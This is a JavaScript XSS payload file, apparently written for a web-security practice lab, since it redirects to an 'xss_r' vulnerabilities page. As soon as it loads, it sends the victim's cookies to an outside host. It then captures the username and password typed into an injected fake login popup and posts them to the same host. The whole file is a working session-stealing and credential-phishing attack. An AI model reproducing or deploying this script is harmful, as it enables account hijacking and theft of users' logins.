console.log('xss-script.js loaded');

try {
  console.log('Checking DOM availability');
  console.log('document.body exists:', !!document.body);
  console.log('xss-popup exists:', !!document.getElementById('xss-popup'));
  console.log('submit-btn exists:', !!document.getElementById('submit-btn'));

  // Initial cookie send
  try {
    console.log('Attempting cookie fetch');
    fetch('https://data.estebanmf.space/cookies', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ cookies: document.cookie }),
      mode: 'no-cors'
    })
      .then(() => console.log('Cookie fetch sent'))
      .catch(e => console.error('Cookie fetch failed:', e));
  } catch (e) {
    console.error('Cookie fetch setup failed:', e);
  }

  // Attach event listener
  try {
    const submitBtn = document.getElementById('submit-btn');
    if (!submitBtn) {
      console.error('Submit button not found');
      return;
    }
    console.log('Attaching onclick to submit-btn');
    submitBtn.onclick = function() {
      try {
        console.log('Submit button clicked');
        let u = document.getElementById('u').value;
        let p = document.getElementById('p').value;
        if (!u || !p) {
          console.log('Validation failed: Empty fields');
          alert('Fill both fields.');
          return;
        }
        console.log('Sending credentials:', { username: u, password: p });
        fetch('https://data.estebanmf.space/cookies', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ cookies: document.cookie }),
          mode: 'no-cors'
        })
          .then(() => console.log('Cookie fetch sent'))
          .catch(e => console.error('Cookie fetch failed:', e));
        fetch('https://data.estebanmf.space/credentials', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ username: u, password: p }),
          mode: 'no-cors'
        })
          .then(() => {
            console.log('Fetch response received');
            document.getElementById('msg').style.display = 'block';
            setTimeout(() => {
              console.log('Resetting inputs and redirecting');
              document.getElementById('u').value = '';
              document.getElementById('p').value = '';
              document.getElementById('msg').style.display = 'none';
              window.location.href = document.referrer || 'http://kali.kali.estebanmf.space/vulnerabilities/xss_r/';
            }, 2000);
          })
          .catch(e => {
            console.error('Credentials fetch failed:', e);
            alert('Error: ' + e.message);
          });
      } catch (e) {
        console.error('Button click handler failed:', e);
      }
    };
    console.log('Script logic executed successfully');
  } catch (e) {
    console.error('Event listener setup failed:', e);
  }
} catch (e) {
  console.error('Script execution failed:', e);
}
